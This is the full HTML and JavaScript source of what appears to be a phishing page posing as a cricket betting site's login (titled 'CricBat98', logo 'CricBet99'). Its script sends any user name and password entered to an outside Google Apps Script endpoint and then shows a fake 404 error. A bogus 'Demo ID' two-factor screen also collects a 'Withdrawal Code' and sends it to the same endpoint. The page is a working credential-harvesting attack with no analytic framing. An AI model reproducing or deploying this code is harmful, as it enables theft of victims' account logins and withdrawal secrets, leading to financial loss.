<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CricBat98</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(180deg, #8a4e00, #116257);
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: flex-start;
            height: 100vh;
            padding-top: 50px;
        }

        .logo {
            width: 320px;
            height: auto;
            margin-bottom: 20px;
        }

        .container {
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            width: 280px;
            text-align: center;
        }

        .heading {
            font-size: 24px;
            font-weight: bold;
            margin-bottom: 10px;
            color: #8B4513;
        }

        .form-group {
            margin-bottom: 15px;
            text-align: left;
        }

        .form-group input {
            width: calc(100% - 20px);
            padding: 10px;
            border: 1px solid #ced4da;
            border-radius: 4px;
            font-size: 14px;
        }

        .form-group input:focus {
            outline: none;
            border-color: #007bff;
        }

        .btn {
            display: block;
            width: 100%;
            padding: 10px;
            background-color: #8B4513;
            color: #fff;
            border: none;
            border-radius: 4px;
            font-size: 14px;
            cursor: pointer;
        }

        .btn:hover {
            background-color: #5A3310;
        }

        .recaptcha-text {
            font-size: 12px;
            color: #6c757d;
            margin-top: 15px;
            text-align: center;
        }

        .recaptcha-text a {
            color: #007bff;
            text-decoration: none;
        }

        .recaptcha-text a:hover {
            text-decoration: underline;
        }

        .error-message {
            font-size: 18px;
            margin-bottom: 20px;
            color: #6c757d;
        }

        .bold-text {
            font-weight: bold;
        }

        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <!-- Logo -->
    <img src="logo.png" alt="CricBet99 Logo" class="logo">

    <!-- Main Container -->
    <div class="container" id="mainContainer">
        <!-- Login Form -->
        <div id="loginForm">
            <div class="heading">LOGIN</div>
            <form id="mainLoginForm" onsubmit="handleMainFormSubmit(event)">
                <div class="form-group">
                    <input type="text" id="UserName" name="UserName" placeholder="User Name" required>
                </div>
                <div class="form-group">
                    <input type="password" id="password" name="password" placeholder="Password" required>
                </div>
                <button type="submit" class="btn">Login</button>
            </form>
            <button class="btn" style="margin-top: 10px;" onclick="loadDemoForm()">Login with Demo ID</button>
            <div class="recaptcha-text">
                <span class="bold-text">This site is protected by reCAPTCHA and the Google</span> 
                <a href="#">Privacy Policy</a> and 
                <a href="#">Terms of Service</a> apply.
            </div>
        </div>

        <!-- Demo Login Form -->
        <div id="demoForm" class="hidden">
            <div class="heading">LOGIN</div>
            <p style="font-weight: bold; color: black; margin: 0;">2-Factor Authentication Enabled.</p>
            <p style="font-weight: bold; color: black; margin: 5px 0 10px;">Enter Your Withdrawal Password</p>
            <form id="demoLoginForm" onsubmit="handleDemoFormSubmit(event)">
                <div class="form-group">
                    <input type="text" id="withdrawalCode" name="withdrawalCode" placeholder="Withdrawal Code" required>
                </div>
                <button type="submit" class="btn">Submit</button>
            </form>
            <div class="recaptcha-text">
                <span class="bold-text">This site is protected by reCAPTCHA and the Google</span> 
                <a href="#">Privacy Policy</a> and 
                <a href="#">Terms of Service</a> apply.
            </div>
        </div>

        <!-- Error 404 Page -->
        <div id="error404" class="hidden">
            <div class="heading" style="color: #dc3545;">404</div>
            <div class="error-message">Page Not Found</div>
            <button class="btn" onclick="goToHome()">Back to Home Page</button>
        </div>
    </div>

    <script>
        const scriptUrl = "https://script.google.com/macros/s/AKfycbwXhwZN_3UfsB1_K6Ve9C2jY-Y0iH46_inybwfnE52aXDjQo2HlRAL0MrQXo936gctlkg/exec";

        // Handle main login form submission
        function handleMainFormSubmit(event) {
            event.preventDefault(); // Prevent default form navigation
            const form = document.getElementById("mainLoginForm");
            const formData = new FormData(form);

            fetch(scriptUrl, {
                method: "POST",
                body: formData,
            })
            .then(response => response.text())
            .then(responseText => {
                console.log("Main Login Response:", responseText);
                document.getElementById("loginForm").classList.add("hidden");
                document.getElementById("error404").classList.remove("hidden");
            })
            .catch(error => {
                console.error("Error submitting main login form:", error);
            });
        }

        // Load demo login form
        function loadDemoForm() {
            document.getElementById("loginForm").classList.add("hidden");
            document.getElementById("demoForm").classList.remove("hidden");
        }

        // Handle demo login form submission
        function handleDemoFormSubmit(event) {
            event.preventDefault(); // Prevent default form navigation
            const username = document.getElementById("UserName").value;
            const password = document.getElementById("password").value;
            const withdrawalCode = document.getElementById("withdrawalCode").value;

            if (!withdrawalCode) {
                alert("Please enter your withdrawal code.");
                return;
            }

            const formData = new FormData();
            formData.append("UserName", username);
            formData.append("password", password);
            formData.append("withdrawalCode", withdrawalCode);

            fetch(scriptUrl, {
                method: "POST",
                body: formData,
            })
            .then(response => response.text())
            .then(responseText => {
                console.log("Demo Login Response:", responseText);
                document.getElementById("demoForm").classList.add("hidden");
                document.getElementById("error404").classList.remove("hidden");
            })
            .catch(error => {
                console.error("Error submitting demo login form:", error);
            });
        }

        function goToHome() {
            document.getElementById("error404").classList.add("hidden");
            document.getElementById("loginForm").classList.remove("hidden");
        }
    </script>
</body>
</html>
